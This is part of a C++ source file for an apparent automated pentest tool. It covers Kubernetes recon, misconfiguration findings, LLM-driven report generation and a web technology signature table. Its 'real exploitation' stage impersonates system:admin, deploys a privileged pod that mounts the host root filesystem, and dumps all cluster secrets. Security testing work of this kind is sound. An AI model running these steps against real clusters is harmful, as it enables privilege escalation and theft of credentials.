}

// collecte récursive de fichiers
static std::vector<fs::path> collect_all_files_recursive(const fs::path& root){
    std::vector<fs::path> out;
    try{
        if (!fs::exists(root)) return out;
        for (auto &p : fs::recursive_directory_iterator(root)){
            if (p.is_regular_file()) out.push_back(p.path());
        }
    }catch(...){}
    return out;
}

static bool run_k8s_tool(const std::string& exeName,
                         const std::vector<std::string>& args,
                         const fs::path& out,
                         std::string& out_stdout,
                         std::string& out_stderr)
{
    std::string exeFull;

    fs::path p = exeName;               // exeName NE DOIT PAS contenir de guillemets
    if (p.has_parent_path()) {
        // Appel avec un chemin (ex: ".\\kube\\kubescape.exe")
        exeFull = p.string();
    } else {
#ifdef _WIN32
        fs::path local = g_kube_dir / (exeName + ".exe");
        if (fs::exists(local)) exeFull = local.string();
        else {
            fs::path local2 = g_kube_dir / exeName;
            exeFull = fs::exists(local2) ? local2.string() : exeName; // PATH
        }
#else
        fs::path local = g_kube_dir / exeName;
        exeFull = fs::exists(local) ? local.string() : exeName;       // PATH
#endif
    }

    // Construit la ligne de commande avec UN SEUL quoting de l'exécutable
    std::string cmd = quote(exeFull);
    for (auto &a : args) cmd += " " + a;     // tes args sont déjà safe/quotés au besoin

    std::string so, se;
    bool ok = run_command_capture(cmd, so, se, 0, false);
    out_stdout = so; out_stderr = se;

    try{
        fs::create_directories(out.parent_path());
        std::ofstream ofs(out, std::ios::binary);
        ofs << so;
    }catch(...){}

    if(!ok) logerr("run_k8s_tool failed: " + cmd + "\n" + se);
    return ok;
}

// 2) run_kubectl_json: force -o json
static bool run_kubectl_json(const std::vector<std::string>& kargs, const fs::path& out_json)
{
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");

    std::vector<std::string> args;
    if(!g_kubecontext.empty()){ args.push_back("--context"); args.push_back(g_kubecontext); }
    if(!g_kubeconfig.empty()){ args.push_back("--kubeconfig"); args.push_back(quote(g_kubeconfig)); }

    for(auto &a: kargs) args.push_back(a);

    bool has_o=false;
    for(size_t i=0;i+1<args.size();++i){
        if(args[i]=="-o" && args[i+1]=="json"){ has_o=true; break; }
    }
    if(!has_o){ args.push_back("-o"); args.push_back("json"); }

    std::string cmd = kubectl;
    for(auto &a: args) cmd += " " + a;

    std::string so,se;
    bool ok = run_command_capture(cmd, so, se, 0, false);

    try{
        fs::create_directories(out_json.parent_path());
        std::ofstream ofs(out_json, std::ios::binary); ofs<<so; ofs.close();
    }catch(...){}

    if(!ok) logerr("kubectl failed: " + cmd + "\n" + se);
    return ok;
}

// -- 1) Test d'impersonation : tente une requête avec --as=system:admin
static bool k8s_try_impersonation(const fs::path& out_file){
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");

    auto run = [&](const std::vector<std::string>& args, std::string& so, std::string& se)->bool{
        std::ostringstream cmd; cmd << kubectl;
        if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
        if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << '"' << g_kubeconfig << '"';
        for (auto& a: args) cmd << " " << a;
        return run_command_capture(cmd.str(), so, se, 0, false);
    };

    std::string so,se;
    bool ok = run({"--as=system:admin","get","pods","-A","-o","wide"}, so, se);

    std::ofstream ofs(out_file, std::ios::binary);
    ofs << "CMD: kubectl --as=system:admin get pods -A -o wide\n\n";
    ofs << "STDOUT:\n" << so << "\n\nSTDERR:\n" << se << "\n";
    ofs << "\nRESULT: " << (ok && se.find("forbidden") == std::string::npos ? "LIKELY VULNERABLE (impersonation worked)" : "blocked") << "\n";
    return ok;
}

// -- 2) Création d’un pod privilégié (POC)
static bool k8s_try_privileged_pod(const fs::path& wd, const std::string& ns, const std::string& name){
    fs::path yaml = wd/(name + ".yaml");
    const char* Y =
R"(apiVersion: v1
kind: Pod
metadata:
  name: PNAME
  namespace: PNS
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: privesc
    image: alpine:3.19
    securityContext:
      privileged: true
    command: ["sh","-c","id; uname -a; sleep 3600"]
    volumeMounts:
    - name: root
      mountPath: /hostroot
      readOnly: true
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
)";
    std::string y(Y);
    auto rep=[&](const std::string& k,const std::string& v){
        size_t p=0; while((p=y.find(k,p))!=std::string::npos){ y.replace(p,k.size(),v); p+=v.size(); }
    };
    rep("PNAME", name);
    rep("PNS",   ns);
    try { std::ofstream f(yaml); f<<y; } catch(...) {}

    const std::string kubectl = resolve_cmd("kubectl", "kubectl");
    auto run = [&](const std::vector<std::string>& args, std::string& so, std::string& se)->bool{
        std::ostringstream cmd; cmd << kubectl;
        if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
        if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << '"' << g_kubeconfig << '"';
        for (auto& a: args) cmd << " " << a;
        return run_command_capture(cmd.str(), so, se, 0, false);
    };

    std::string so,se, logs;

    // create ns (idempotent)
    run({"create","ns",ns,"--dry-run=client","-o","yaml"}, so, se);
    run({"apply","-f", quote(yaml.string())}, so, se);

    // wait Ready
    run({"wait","--for=condition=Ready","pod/"+name,"-n",ns,"--timeout=120s"}, so, se);

    // logs preuve
    run({"logs","-n",ns,name}, logs, se);

    std::ofstream pf(wd/(name + "_result.txt"), std::ios::binary);
    pf << "APPLY/WAIT STDERR:\n" << se << "\n\nLOGS:\n" << logs << "\n";
    pf.close();

    // cleanup
    run({"delete","pod",name,"-n",ns,"--ignore-not-found=true"}, so, se);
    return true;
}

// -- 3) Exfil secrets (si autorisé) : liste + dump
static bool k8s_dump_secrets(const fs::path& wd){
    run_kubectl_json({"get","secrets","-A"}, wd/"k8s_secrets_list.json");

    const std::string kubectl = resolve_cmd("kubectl", "kubectl");
    std::string so,se;
    std::ostringstream cmd;
    cmd << kubectl;
    if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
    if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << '"' << g_kubeconfig << '"';
    cmd << " get secrets -A -o yaml";
    run_command_capture(cmd.str(), so, se, 0, false);

    std::ofstream ofs(wd/"k8s_secrets_dump.yaml", std::ios::binary);
    ofs << so << "\n\n# STDERR\n" << se << "\n";
    return true;
}

// 3) run_kubectl_job_logs: apply job, attendre completion, récupérer logs
static bool run_kubectl_job_logs(const fs::path& jobYaml,
                          const std::string& ns,
                          const std::string& jobName,
                          const fs::path& out_file)
{
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");

    auto kubecmd = [&](std::vector<std::string> extra, std::string &so, std::string &se)->bool{
        std::ostringstream cmd; cmd << kubectl;
        if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
        if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << quote(g_kubeconfig);
        for(auto &a: extra) cmd << " " << a;
        return run_command_capture(cmd.str(), so, se, 0, false);
    };

    std::string so,se;

    // apply -f
    if(!kubecmd({"apply","-n",ns,"-f",quote(jobYaml.string())}, so, se)){
        logerr(se); return false;
    }

    // wait complete
    if(!kubecmd({"wait","-n",ns,"--for=condition=complete","job/"+jobName,"--timeout=300s"}, so, se)){
        logerr("job wait failed: "+se);
    }

    // pod name
    bool got=false; std::string podName;
    if(kubecmd({"get","pods","-n",ns,"-l","job-name="+jobName,"-o","jsonpath={.items[0].metadata.name}"}, so, se)){
        podName = so;
        got = !podName.empty();
    }

    // logs
    std::string logs;
    if(got){
        kubecmd({"logs","-n",ns,podName}, logs, se);
    }else{
        kubecmd({"logs","-n",ns,"job/"+jobName}, logs, se);
    }

    try{
        fs::create_directories(out_file.parent_path());
        std::ofstream ofs(out_file, std::ios::binary); ofs<<logs; ofs.close();
    }catch(...){}

    // cleanup
    kubecmd({"delete","job",jobName,"-n",ns}, so, se);
    return true;
}

// Crée namespace kube-bench puis l'applique
static void k8s_prepare_kube_bench_namespace(const fs::path& wd){
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");
    std::string so, se;

    std::ostringstream cmd1;
    cmd1 << kubectl;
    if(!g_kubecontext.empty()) cmd1 << " --context " << g_kubecontext;
    if(!g_kubeconfig.empty())  cmd1 << " --kubeconfig " << '"' << g_kubeconfig << '"';
    cmd1 << " create ns kube-bench --dry-run=client -o yaml";
    run_command_capture(cmd1.str(), so, se, 0, false);

    fs::path nsFile = wd / "ns_kube-bench.yaml";
    try { std::ofstream f(nsFile); f << so; } catch(...) {}
    std::ostringstream cmd2;
    cmd2 << kubectl;
    if(!g_kubecontext.empty()) cmd2 << " --context " << g_kubecontext;
    if(!g_kubeconfig.empty())  cmd2 << " --kubeconfig " << '"' << g_kubeconfig << '"';
    cmd2 << " apply -f " << '"' << nsFile.string() << '"';
    run_command_capture(cmd2.str(), so, se, 0, false);
}

// Construit le Job kube-bench et récupère logs JSON
static void k8s_run_kube_bench_job(const fs::path& wd){
    fs::path jobY = wd / "job-kube-bench.yaml";
    const char* JOB =
R"(apiVersion: batch/v1
kind: Job
metadata:
  name: kube-bench
  namespace: kube-bench
spec:
  template:
    spec:
      hostPID: true
      containers:
      - name: kube-bench
        image: aquasec/kube-bench:latest
        command: ["kube-bench","--json"]
        volumeMounts:
        - name: var-lib-etcd
          mountPath: /var/lib/etcd
        - name: var-lib-kubelet
          mountPath: /var/lib/kubelet
        - name: etc-systemd
          mountPath: /etc/systemd
        - name: etc-kubernetes
          mountPath: /etc/kubernetes
      restartPolicy: Never
      volumes:
      - name: var-lib-etcd
        hostPath: { path: /var/lib/etcd }
      - name: var-lib-kubelet
        hostPath: { path: /var/lib/kubelet }
      - name: etc-systemd
        hostPath: { path: /etc/systemd }
      - name: etc-kubernetes
        hostPath: { path: /etc/kubernetes }
  backoffLimit: 0
)";
    try { std::ofstream f(jobY); f << JOB; } catch(...) {}
    run_kubectl_job_logs(jobY, "kube-bench", "kube-bench", wd / "k8s_kube_bench.json");
}

// --- Findings K8s (cross-platform, sans jq) -------------------------------
static json filter_findings_from_inventory(const json& inv) {
    // Namespaces système à ignorer
    std::regex noise_ns(
        R"(^(kube-|openshift-|istio-system$|linkerd$|cilium$|tigera-operator$|calico-system$))",
        std::regex::icase
    );
    auto is_noise = [&](const std::string& ns){ return std::regex_search(ns, noise_ns); };

    auto extract_podspec = [](const json& obj)->json {
        if (obj.value("kind", "") == "Pod" && obj.contains("spec")) return obj["spec"];
        if (obj.contains("spec") && obj["spec"].contains("template") && obj["spec"]["template"].contains("spec"))
            return obj["spec"]["template"]["spec"];
        return json(); // null
    };

    json findings = json::array();

    for (const auto& obj : inv.value("items", json::array())) {
        std::string kind = obj.value("kind", "");
        std::string ns   = obj["metadata"].value("namespace", "");
        std::string name = obj["metadata"].value("name", "");
        if (ns.empty() || is_noise(ns)) continue;

        // Service exposé en NodePort
        if (kind == "Service" && obj.contains("spec") && obj["spec"].value("type","") == "NodePort") {
            json f; f["kind"]=kind; f["namespace"]=ns; f["name"]=name;
            f["issues"] = json::array({ {{"id","service_nodeport_exposed"},{"ports", obj["spec"]["ports"]}} });
            findings.push_back(std::move(f));
            continue;
        }

        // Pod/Controller
        json ps = extract_podspec(obj);
        if (ps.is_null()) continue;

        json issues = json::array();
        if (ps.value("hostNetwork", false)) issues.push_back({{"id","hostnetwork_true"}});
        if (ps.value("hostPID",     false)) issues.push_back({{"id","hostpid_true"}});
        if (ps.value("hostIPC",     false)) issues.push_back({{"id","hostipc_true"}});

        if (ps.contains("volumes") && ps["volumes"].is_array()) {
            for (const auto& v : ps["volumes"]) {
                if (v.contains("hostPath")) {
                    issues.push_back({
                        {"id","hostpath_volume"},
                        {"volume", v.value("name","")},
                        {"path",   v["hostPath"].value("path","")},
                        {"type",   v["hostPath"].value("type","")}
                    });
                }
            }
        }

        auto scan_containers = [&](const json& arr){
            if (!arr.is_array()) return;
            for (const auto& c : arr) {
                std::string cname = c.value("name","");
                const auto& sc = c.value("securityContext", json::object());
                if (sc.value("privileged", false))
                    issues.push_back({{"id","privileged_container"},{"container",cname}});
                if (sc.value("allowPrivilegeEscalation", false))
                    issues.push_back({{"id","allow_privilege_escalation_true"},{"container",cname}});
                if (sc.contains("runAsUser") && sc.value("runAsUser", 1) == 0)
                    issues.push_back({{"id","run_as_root_uid0"},{"container",cname}});
                if (sc.contains("runAsNonRoot") && sc.value("runAsNonRoot", true) == false)
                    issues.push_back({{"id","run_as_non_root_false"},{"container",cname}});

                std::string img = c.value("image","");
                bool latest_or_missing = false;
                if (!img.empty()) {
                    auto pos = img.rfind(':');
                    latest_or_missing = (pos == std::string::npos) || (img.substr(pos+1) == "latest");
                }
                if (latest_or_missing)
                    issues.push_back({{"id","image_tag_latest_or_missing"},{"container",cname},{"image",img}});

                if (c.contains("ports") && c["ports"].is_array()) {
                    for (const auto& prt : c["ports"]) {
                        if (prt.contains("hostPort"))
                            issues.push_back({{"id","host_port_exposed"},{"container",cname},
                                              {"hostPort", prt.value("hostPort",0)},
                                              {"containerPort", prt.value("containerPort",0)}});
                    }
                }
            }
        };
        scan_containers(ps.value("containers", json::array()));
        scan_containers(ps.value("initContainers", json::array()));
        scan_containers(ps.value("ephemeralContainers", json::array()));

        if (!issues.empty()) {
            json f; f["kind"]=kind; f["namespace"]=ns; f["name"]=name; f["issues"]=issues;
            findings.push_back(std::move(f));
        }
    }

    // summary
    std::map<std::string,int> counts;
    for (const auto& f : findings) {
        for (const auto& it : f.value("issues", json::array()))
            counts[it.value("id","")]++;
    }
    json summary = json::object();
    for (auto& kv : counts) summary[kv.first] = kv.second;

    return json{{"summary", summary}, {"findings", findings}};
}

static bool generate_findings_only(const fs::path& wd, fs::path& out_findings_json) {
    // 1) inventaire minimal (évite cluster-info dump)
    fs::path inv_min = wd / "k8s_inv_min.json";
    if (!run_kubectl_json({"get","pods,deploy,ds,sts,cronjob,svc","-A"}, inv_min)) {
        logerr("kubectl inventory (minimal) failed");
        return false;
    }

    // 2) charge + filtre
    json inv;
    try { inv = json::parse(readFile(inv_min.string())); }
    catch (const std::exception& ex) {
        logerr(std::string("parse inv_min failed: ") + ex.what());
        return false;
    }
    json out = filter_findings_from_inventory(inv);

    // 3) sauvegarde
    out_findings_json = wd / "k8s_inventory_findings.json";
    try { std::ofstream ofs(out_findings_json); ofs << std::setw(2) << out; }
    catch (...) { logerr("write findings failed"); return false; }

    // 4) petit récap console
    std::vector<std::pair<std::string,std::string>> rows;
    rows.emplace_back("K8S findings JSON", out_findings_json.string());
    if (out.contains("summary")) {
        int total = 0;
        for (auto it = out["summary"].begin(); it != out["summary"].end(); ++it) total += it.value().get<int>();
        rows.emplace_back("Findings count", std::to_string(total));
    }
    print_kv_table(rows, {"K8S findings JSON","Findings count"});
    return true;
}

// Orchestrateur K8s
static bool run_agentfactory_k8s(const AgentOptions& opt){
    print_dark_moon();
    std::cout << ansi::green << "[K8S] Start pentest (cluster+RBAC)" << ansi::reset << std::endl;

    // --- Workdir
    const std::string hostpart = extract_hostname(opt.baseurl.empty() ? "k8s" : opt.baseurl);
    const std::string ts = current_datetime_string();
    fs::path wd = fs::path(opt.outdir) / (std::string("k8s_") + hostpart + "_" + ts);
    try { fs::create_directories(wd); } catch(...) {}

    // Détecte binaires optionnels
    const std::string exe_kubectl     = resolve_cmd("kubectl", "kubectl");
    const std::string exe_kubescape   = resolve_cmd("kubescape", "kubescape");
    const std::string exe_rbac_police = resolve_cmd("rbac-police", "rbac-police");
    const std::string exe_whocan      = resolve_cmd("kubectl-who-can", "kubectl-who-can");
#ifdef _WIN32
    // kubeletctl Windows peut avoir un binaire spécifique
    const std::string exe_kubeletctl  = resolve_cmd("kubeletctl_windows_386", "kubeletctl_windows_386.exe");
#else
    const std::string exe_kubeletctl  = resolve_cmd("kubeletctl", "kubeletctl");
#endif

    // ===== A — Recon kubelet =====
    {
        std::string out, err;
        if (exe_kubeletctl != "kubeletctl" && exe_kubeletctl != "kubeletctl_windows_386.exe") {
            run_k8s_tool(exe_kubeletctl, {"scan", opt.host}, wd / "k8s_kubelet_findings.txt", out, err);
        } else {
            // tentative via PATH
            run_k8s_tool(exe_kubeletctl, {"scan", opt.host}, wd / "k8s_kubelet_findings.txt", out, err);
        }
    }

// ===== B — Inventory / Findings only =====
{
    fs::path findings_json;
    if (!generate_findings_only(wd, findings_json)) {
        logerr("Failed to generate K8S findings-only JSON");
    } else {
        // (Optionnel) Si tu veux éviter le gros dump :
        // // run_kubectl_json({"cluster-info","dump","-o","json"}, wd / "k8s_inventory.json");

        // (Optionnel) Tu peux aussi commenter l'appel kubescape si tu veux vraiment un résultat "léger"
        // std::string out, err;
        // run_k8s_tool(exe_kubescape, {"scan","framework","nsa,mitre","--format","json","--output",
        //              (wd/"k8s_kubescape.json").string()}, wd / "k8s_kubescape.json", out, err);
    }
}

    // ===== C — kube-bench via Job =====
    {
        k8s_prepare_kube_bench_namespace(wd);
        k8s_run_kube_bench_job(wd);
    }

    // ===== D — RBAC : analyse + preuves =====
    {
        std::string out, err;
        run_k8s_tool(exe_rbac_police, {"--format","json"}, wd / "rbac_police_report.json", out, err);

        const std::vector<std::string> verbs = {"get","list","create","delete","impersonate"};
        for (const auto& v : verbs) {
            run_k8s_tool(exe_whocan, {v, "pods", "-A"}, wd / ("rbac_whocan_" + v + ".txt"), out, err);
        }
        run_k8s_tool(exe_whocan, {"get","secrets","-A"}, wd / "rbac_whocan_get_secrets.txt", out, err);
        run_k8s_tool(exe_whocan, {"create","pods/exec","-A"}, wd / "rbac_whocan_create_podsexec.txt", out, err);
    }

    // ===== E — Exploitation réelle =====
    {
        k8s_try_impersonation(wd / "exploit_impersonation.txt");
        k8s_try_privileged_pod(wd, "redteam", "privesc-pod");
        k8s_dump_secrets(wd);
        std::string out, err;
        run_k8s_tool(exe_kubeletctl, {"scan", opt.host}, wd / "k8s_kubelet_rescan.txt", out, err);
    }

    // ===== F — Récapitulatif console =====
    {
        std::vector<std::pair<std::string,std::string>> rows;
        rows.push_back({"inventory",              (wd/"k8s_inventory.json").string()});
        rows.push_back({"kubescape",              (wd/"k8s_kubescape.json").string()});
        rows.push_back({"kube-bench",             (wd/"k8s_kube_bench.json").string()});
        rows.push_back({"rbac-police",            (wd/"rbac_police_report.json").string()});
        rows.push_back({"who-can (pods/secrets)", (wd/"rbac_whocan_get_secrets.txt").string()});
        rows.push_back({"impersonation test",     (wd/"exploit_impersonation.txt").string()});
        rows.push_back({"privileged pod POC",     (wd/"privesc-pod_result.txt").string()});
        rows.push_back({"secrets dump",           (wd/"k8s_secrets_dump.yaml").string()});
        rows.push_back({"kubelet scan",           (wd/"k8s_kubelet_findings.txt").string()});
        print_kv_table(rows, std::unordered_set<std::string>{"kube-bench","rbac-police","privileged pod POC"});
    }

    // ===== G — Rapports MCP (CLI + Markdown) =====
    {
        // 1) Collecte récursive
        std::vector<fs::path> report_files;
        try {
            if (fs::exists(wd)) {
                for (auto &p : fs::recursive_directory_iterator(wd)) {
                    if (p.is_regular_file()) report_files.push_back(p.path());
                }
            }
        } catch (...) {}

        std::cout << ansi::sky << "[K8S] Files to inject into MCP: "
                  << ansi::white << report_files.size()
                  << ansi::reset << std::endl;

        if (report_files.empty()) {
            std::cerr << ansi::red << "WARN: no files found under " << wd.string()
                      << " — MCP reports may be empty." << ansi::reset << std::endl;
        }

        // 2) Dossier rapport + templates
        fs::path report_dir = fs::path(opt.outdir) / "report";
        try { fs::create_directories(report_dir); } catch(...) {}

        const std::string TPL_K8S_CLI = "prompt-rapport-k8s.txt";
        const std::string TPL_K8S_MD  = "prompt-rapport-k8s-md.txt";

        // 3) Sorties
        fs::path cli_out = report_dir / (hostpart + "_" + ts + "_k8s_report.txt");
        fs::path md_out  = report_dir / (hostpart + "_" + ts + "_k8s_report.md");

        // 4) Rapport CLI — imprime déjà sur console
        {
            std::string report_cli_raw;
            std::cout << ansi::green << "[K8S] Pentest report generation (CLI)..." << ansi::reset << std::endl;

            bool ok_cli = call_mcp_report_with_files(
                opt.mcp_path,
                get_exe_parent_dir(),
                report_files,
                TPL_K8S_CLI,
                report_cli_raw
            );

            // Sauvegarde .txt
            try { std::ofstream ofs(cli_out, std::ios::binary); ofs << report_cli_raw; } catch(...) {}

            if (!ok_cli) {
                logerr("Failed to generate K8s CLI report via " + TPL_K8S_CLI);
            } else {
                std::vector<std::pair<std::string,std::string>> rows_cli;
                rows_cli.push_back({"K8S CLI report", cli_out.string()});
                print_kv_table(rows_cli, std::unordered_set<std::string>{"K8S CLI report"});
            }
        }

        // 5) Rapport MARKDOWN — fichier uniquement
        {
            std::string report_md_raw;
            std::cout << ansi::green << "[K8S] Pentest report generation (Markdown)..." << ansi::reset << std::endl;

            bool ok_md = call_mcp_report_with_files(
                opt.mcp_path,
                get_exe_parent_dir(),
                report_files,
                TPL_K8S_MD,
                report_md_raw,
                md_out
            );

            if (!ok_md) {
                logerr("Failed to generate K8s Markdown report via " + TPL_K8S_MD);
            } else {
                std::vector<std::pair<std::string,std::string>> rows_md;
                rows_md.push_back({"K8S Markdown report", md_out.string()});
                rows_md.push_back({"All outputs (root)", wd.string()});
                print_kv_table(rows_md, std::unordered_set<std::string>{"K8S Markdown report","All outputs (root)"});
            }
        }
    }

    std::cout << ansi::green << "[K8S] Done. Outputs -> " << ansi::white << wd.string() << ansi::reset << "\n";
    return true;
}

// -----------------------------------------------------------------------------
// Phase 2 : "IA locale" symbolique pour la validation / confirmation Web
// -----------------------------------------------------------------------------
// À coller au dessus de run_recon_web_chain() / run_post_naabu_enrichment().
// -----------------------------------------------------------------------------

struct ReconEvidence {
    std::string key;        // techno / vuln détectée (ex: "WordPress", "Jenkins", "CVE-2021-XXXXX")
    std::string source;     // "httpx", "nuclei", "whatweb", "wafw00f", ...
    std::string location;   // URL principale ou host
    std::string severity;   // "low" / "medium" / "high" / "critical" (si dispo)
    std::string raw;        // ligne brute ou extrait JSON pour debug
};

struct ConfirmationCommand {
    std::string id;          // identifiant logique (ex: "confirm_wordpress_nuclei")
    std::string description; // phrase courte pour le rapport / console
    std::string command;     // commande shell complète à lancer
    fs::path     outfile;    // fichier de sortie (stdout+stderr)
};

// Familles logiques DarkMoon (simplifiées pour Web)
enum class ProtoFamily {
    proto_http_web,
    proto_auth_aaa,
    proto_db_sql,
    proto_db_nosql,
    proto_message_bus,
    proto_vpn_tunnel,
    proto_encryption,
    proto_fileshare,
    proto_other
};

struct TechSignature {
    const char* keyword;     // token à chercher dans les sorties (httpx/whatweb)
    ProtoFamily family;      // famille logique
    const char* category;    // "CMS", "CI/CD", "K8S", "Panel", ...
    const char* nuclei_tags; // tags nuclei à utiliser pour validation ciblée
};

// Table de signatures
static const TechSignature kWebTechSignatures[] = {
    // --- CMS / E-commerce -----------------------------------------------------
    {"WordPress",      ProtoFamily::proto_http_web,  "CMS",          "wordpress,wp"},
    {"Joomla",         ProtoFamily::proto_http_web,  "CMS",          "joomla"},
    {"Drupal",         ProtoFamily::proto_http_web,  "CMS",          "drupal"},
    {"Magento",        ProtoFamily::proto_http_web,  "ECommerce",    "magento"},
    {"PrestaShop",     ProtoFamily::proto_http_web,  "ECommerce",    "prestashop"},
    {"WooCommerce",    ProtoFamily::proto_http_web,  "ECommerce",    "wordpress,woocommerce"},

    // --- PHP frameworks -------------------------------------------------------
    {"Laravel",        ProtoFamily::proto_http_web,  "FrameworkPHP", "laravel"},
    {"Symfony",        ProtoFamily::proto_http_web,  "FrameworkPHP", "symfony"},
    {"CodeIgniter",    ProtoFamily::proto_http_web,  "FrameworkPHP", ""},
    {"Zend Framework", ProtoFamily::proto_http_web,  "FrameworkPHP", ""},
    {"Yii",            ProtoFamily::proto_http_web,  "FrameworkPHP", ""},
    {"CakePHP",        ProtoFamily::proto_http_web,  "FrameworkPHP", ""},

    // --- Java / JVM -----------------------------------------------------------
    {"Spring",         ProtoFamily::proto_http_web,  "FrameworkJava","spring,springboot"},
    {"Spring Boot",    ProtoFamily::proto_http_web,  "FrameworkJava","spring,springboot"},
    {"Struts",         ProtoFamily::proto_http_web,  "FrameworkJava","struts"},
    {"JSF",            ProtoFamily::proto_http_web,  "FrameworkJava",""},
    {"Vaadin",         ProtoFamily::proto_http_web,  "FrameworkJava",""},
    {"Play Framework", ProtoFamily::proto_http_web,  "FrameworkJava",""},
    {"Grails",         ProtoFamily::proto_http_web,  "FrameworkJava",""},

    // --- .NET -----------------------------------------------------------------
    {"ASP.NET",        ProtoFamily::proto_http_web,  ".NET",         "aspnet"},
    {"ASP.NET Core",   ProtoFamily::proto_http_web,  ".NET",         "aspnet"},
    {"Kestrel",        ProtoFamily::proto_http_web,  ".NET",         ""},

    // --- Python / Ruby --------------------------------------------------------
    {"Django",         ProtoFamily::proto_http_web,  "Python",       "django"},
    {"Flask",          ProtoFamily::proto_http_web,  "Python",       "flask"},
    {"FastAPI",        ProtoFamily::proto_http_web,  "Python",       ""},
    {"Ruby on Rails",  ProtoFamily::proto_http_web,  "Ruby",         "rails"},
    {"Rails",          ProtoFamily::proto_http_web,  "Ruby",         "rails"},

    // --- Node.js / JS backend -------------------------------------------------
    {"Node.js",        ProtoFamily::proto_http_web,  "NodeJS",       "nodejs"},
    {"Express",        ProtoFamily::proto_http_web,  "NodeJS",       "nodejs,express"},
    {"Koa",            ProtoFamily::proto_http_web,  "NodeJS",       "nodejs"},
    {"Hapi",           ProtoFamily::proto_http_web,  "NodeJS",       "nodejs"},
    {"NestJS",         ProtoFamily::proto_http_web,  "NodeJS",       "nestjs"},
    {"Next.js",        ProtoFamily::proto_http_web,  "NodeJS",       "nextjs"},
    {"Nuxt.js",        ProtoFamily::proto_http_web,  "NodeJS",       "nuxtjs"},

    // --- Go web frameworks ----------------------------------------------------
    {"Gin",            ProtoFamily::proto_http_web,  "Go",           "gin"},
    {"Echo",           ProtoFamily::proto_http_web,  "Go",           "echo"},
    {"Fiber",          ProtoFamily::proto_http_web,  "Go",           "fiber"},
    {"Beego",          ProtoFamily::proto_http_web,  "Go",           ""},

    // --- API / GraphQL / Swagger ----------------------------------------------
    {"GraphQL",        ProtoFamily::proto_http_web,  "API",          "graphql"},
    {"Apollo GraphQL", ProtoFamily::proto_http_web,  "API",          "graphql"},
    {"Swagger UI",     ProtoFamily::proto_http_web,  "APIConsole",   "swagger,openapi"},
    {"OpenAPI",        ProtoFamily::proto_http_web,  "APIConsole",   "openapi"},
    {"Redoc",          ProtoFamily::proto_http_web,  "APIConsole",   "openapi"},

    // --- API Gateways ---------------------------------------------------------
    {"Kong",           ProtoFamily::proto_http_web,  "APIGateway",   "kong"},
    {"Tyk",            ProtoFamily::proto_http_web,  "APIGateway",   ""},
    {"Apigee",         ProtoFamily::proto_http_web,  "APIGateway",   "apigee"},
    {"Gravitee",       ProtoFamily::proto_http_web,  "APIGateway",   ""},

    // --- CI/CD / SCM / registries ---------------------------------------------
    {"Jenkins",        ProtoFamily::proto_http_web,  "CI/CD",        "jenkins"},
    {"GitLab",         ProtoFamily::proto_http_web,  "SCM",          "gitlab"},
    {"GitHub Enterprise", ProtoFamily::proto_http_web, "SCM",        ""},
    {"Bitbucket",      ProtoFamily::proto_http_web,  "SCM",          "bitbucket"},
    {"Sonatype Nexus", ProtoFamily::proto_http_web,  "Registry",     "nexus"},
    {"Nexus Repository", ProtoFamily::proto_http_web,"Registry",     "nexus"},
    {"Artifactory",    ProtoFamily::proto_http_web,  "Registry",     "artifactory"},
    {"Harbor",         ProtoFamily::proto_http_web,  "Registry",     "harbor"},
    {"Docker Registry",ProtoFamily::proto_http_web,  "Registry",     "docker-registry"},

    // --- Dashboards / monitoring ----------------------------------------------
    {"Grafana",        ProtoFamily::proto_http_web,  "Dashboard",    "grafana"},
    {"Kibana",         ProtoFamily::proto_http_web,  "Dashboard",    "kibana"},
    {"Prometheus",     ProtoFamily::proto_http_web,  "Monitoring",   "prometheus"},
    {"Elasticsearch",  ProtoFamily::proto_http_web,  "Search",       "elasticsearch"},

    // --- K8s / containers -----------------------------------------------------
    {"Kubernetes Dashboard", ProtoFamily::proto_http_web, "K8s",     "kubernetes,k8s"},
    {"Rancher",        ProtoFamily::proto_http_web,  "K8s",          "rancher"},
    {"OpenShift",      ProtoFamily::proto_http_web,  "K8s",          "openshift"},
    {"Portainer",      ProtoFamily::proto_http_web,  "K8s",          "portainer"},

    // --- IAM / Auth -----------------------------------------------------------
    {"Keycloak",       ProtoFamily::proto_auth_aaa,  "IAM",          "keycloak"},
    {"Auth0",          ProtoFamily::proto_auth_aaa,  "IAM",          ""},
    {"Okta",           ProtoFamily::proto_auth_aaa,  "IAM",          ""},
    {"Azure AD",       ProtoFamily::proto_auth_aaa,  "IAM",          ""},
    {"OpenID Connect", ProtoFamily::proto_auth_aaa,  "IAM",          ""},
    {"OAuth2",         ProtoFamily::proto_auth_aaa,  "IAM",          ""},
    {"SAML",           ProtoFamily::proto_auth_aaa,  "IAM",          ""},

    // --- SQL / consoles DB ----------------------------------------------------
    {"phpMyAdmin",     ProtoFamily::proto_db_sql,    "DBConsole",    "phpmyadmin"},
    {"Adminer",        ProtoFamily::proto_db_sql,    "DBConsole",    "adminer"},
    {"MySQL",          ProtoFamily::proto_db_sql,    "DB",           "mysql"},
    {"MariaDB",        ProtoFamily::proto_db_sql,    "DB",           "mysql"},
    {"PostgreSQL",     ProtoFamily::proto_db_sql,    "DB",           "postgresql"},
    {"SQL Server",     ProtoFamily::proto_db_sql,    "DB",           "mssql"},
    {"MSSQL",          ProtoFamily::proto_db_sql,    "DB",           "mssql"},
    {"Oracle",         ProtoFamily::proto_db_sql,    "DB",           "oracle"},

    // --- NoSQL / caches / consoles -------------------------------------------
    {"MongoDB",        ProtoFamily::proto_db_nosql,  "DB",           "mongodb"},
    {"CouchDB",        ProtoFamily::proto_db_nosql,  "DB",           "couchdb"},
    {"Redis",          ProtoFamily::proto_db_nosql,  "Cache",        "redis"},
    {"Mongo Express",  ProtoFamily::proto_db_nosql,  "DBConsole",    "mongodb"},
